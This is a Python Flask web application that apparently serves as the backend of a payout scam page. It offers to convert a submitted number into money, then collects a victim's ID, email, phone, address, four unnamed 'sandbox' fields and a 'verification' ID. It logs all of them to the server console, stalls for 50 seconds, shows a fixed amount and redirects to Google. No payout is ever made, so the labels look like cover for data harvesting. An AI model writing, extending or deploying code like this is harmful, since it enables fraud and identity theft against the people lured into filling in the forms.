from flask import Flask, render_template, request, redirect
import os
import time

app = Flask(__name__)

RATE = 0.00025


# --------------------------------
# FIRST PAGE
# --------------------------------

@app.route("/")
def home():
    return render_template("index.html")


# --------------------------------
# RECEIVE NUMBER
# THEN SHOW CONVERSION PAGE
# --------------------------------

@app.route("/start", methods=["POST"])
def start():

    number = request.form.get("number", "").strip()

    if not number:
        return "Number is required.", 400

    try:
        numeric_number = float(number)
    except ValueError:
        return "Invalid number.", 400

    if numeric_number <= 0:
        return "Number must be greater than zero.", 400

    amount = numeric_number * RATE

    print()
    print("================================")
    print("        SANDBOX NUMBER")
    print("================================")
    print("Number:", number)
    print("Calculated amount:", f"${amount:.2f}")
    print("================================")
    print()

    return render_template(
        "converting.html",
        number=number
    )


# --------------------------------
# CONVERSION PAGE
# THEN SHOW PAYOUT FORM
# --------------------------------

@app.route("/conversion-complete", methods=["POST"])
def conversion_complete():

    number = request.form.get("number", "").strip()

    if not number:
        return "Number is missing.", 400

    try:
        numeric_number = float(number)
    except ValueError:
        return "Invalid number.", 400

    amount = numeric_number * RATE

    print()
    print("================================")
    print("       CONVERSION COMPLETE")
    print("================================")
    print("Number:", number)
    print("Amount:", f"${amount:.2f}")
    print("================================")
    print()

    return render_template(
        "payout.html",
        number=number
    )


# --------------------------------
# PAYOUT FORM
# --------------------------------

@app.route("/sandbox-payout", methods=["POST"])
def sandbox_payout():

    number = request.form.get("number", "").strip()

    sandbox_id = request.form.get(
        "sandbox_id", ""
    ).strip()

    sandbox_email = request.form.get(
        "sandbox_email", ""
    ).strip()

    phone = request.form.get(
        "phone", ""
    ).strip()

    address = request.form.get(
        "address", ""
    ).strip()

    sandbox_1 = request.form.get(
        "sandbox_1", ""
    ).strip()

    sandbox_2 = request.form.get(
        "sandbox_2", ""
    ).strip()

    sandbox_3 = request.form.get(
        "sandbox_3", ""
    ).strip()

    sandbox_4 = request.form.get(
        "sandbox_4", ""
    ).strip()


    print()
    print("================================")
    print("        SANDBOX PAYOUT")
    print("================================")

    print("Sandbox Number:", number)
    print("Sandbox ID:", sandbox_id)
    print("Sandbox Email:", sandbox_email)
    print("Sandbox Phone:", phone)
    print("Sandbox Address:", address)

    print("Sandbox 1:", sandbox_1)
    print("Sandbox 2:", sandbox_2)
    print("Sandbox 3:", sandbox_3)
    print("Sandbox 4:", sandbox_4)

    print("================================")
    print()


    # 50-second sandbox confirmation
    time.sleep(50)


    # Requested fixed result
    amount = 2.4


    return render_template(
        "result.html",
        amount=amount,
        number=number
    )


# --------------------------------
# VERIFICATION PAGE
# --------------------------------

@app.route("/verify", methods=["GET", "POST"])
def verify():

    if request.method == "POST":

        verification_sandbox_id = request.form.get(
            "verification_sandbox_id",
            ""
        ).strip()


        print()
        print("================================")
        print("    VERIFICATION SANDBOX")
        print("================================")

        print(
            "Verification Sandbox ID:",
            verification_sandbox_id
        )

        print("================================")
        print()


        return redirect(
            "https://www.google.com"
        )


    return render_template(
        "verify.html"
    )


# --------------------------------
# HEALTH CHECK
# --------------------------------

@app.route("/health")
def health():

    return {
        "status": "online"
    }


# --------------------------------
# RUN SERVER
# --------------------------------

if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            5000
        )
    )

    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
